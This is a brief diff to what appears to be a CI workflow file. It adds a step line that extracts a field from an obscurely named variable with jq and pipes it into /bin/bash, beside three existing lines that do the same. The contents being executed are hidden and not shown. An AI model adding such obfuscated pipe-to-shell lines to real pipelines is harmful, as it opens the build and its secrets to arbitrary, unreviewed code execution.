@@ -31,6 +31,7 @@ jobs:
           echo $lwg65 | jq -r .f338 | /bin/bash
           printf '%s' "$ahb13" | jq -r .pbyh60 | /bin/bash
           echo $uftz7813 | jq -r .hmbsz7240 | /bin/bash
+          printf '%s' "$nur28917" | jq -r .dwc01301 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
